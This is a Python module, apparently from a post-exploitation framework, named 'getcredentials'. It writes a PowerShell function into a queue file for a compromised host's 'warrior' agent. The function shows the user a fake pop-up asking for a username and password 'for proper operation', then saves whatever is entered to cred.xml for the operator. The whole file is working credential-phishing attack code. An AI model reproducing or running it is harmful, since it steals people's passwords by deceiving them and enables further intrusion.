from termcolor import colored, cprint
from module import Module
from warrior_check import exist_warrior

class CustomModule(Module):

    def __init__(self):
        information = {"Name": "getcredentials",
                       "Description": "Get user credentials",
                       "Author": "@josueencinar"}

        # -----------name-----default_value--description--required?
        options = {"warrior": [None, "Warrior in war", True],
                   "title": ["Attention please", "Pop-Up Title", False],
                   "message": ["Username and password required for proper operation", "Pop-Up message", False],
                   "domain": ["", "User domain", False]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)


    # This module must be always implemented, it is called by the run option
    def run_module(self):
        if exist_warrior(self.args["warrior"]):
            function = """function getcredentials {
                    param(
                    [Parameter(Mandatory)]
                    [String] $title,
                    [Parameter(Mandatory)]
                    [String] $message,
                    [Parameter(Mandatory=$false)]
                    [String] $domain
                    )

                    if (-not $domain) { $domain = "" }
                    $credential = $host.ui.PromptForCredential($title, $message, "", $domain)
                    $path = ($pwd.Path+"\cred.xml")
                    $credential | Export-Clixml -Path $path
                    # To Import
                    # $credential = Import-Clixml -Path ($pwd.Path+"\cred.xml")
                }
            """

            if self.args["domain"]:
                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "' -domain '" + self.args["domain"] + "'"
            else:
                function += "getcredentials -title '" + self.args["title"] + "' -message '" + self.args["message"] + "'"

            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
                f.write(function)

            cprint ('[+] Done!', 'green')
            cprint ('To use credentials in Powershell >> Import-Clixml -Path ($pwd.Path+"\cred.xml") ', 'yellow')
        else:
            cprint ("[!] Failed... Warrior don't found", 'red')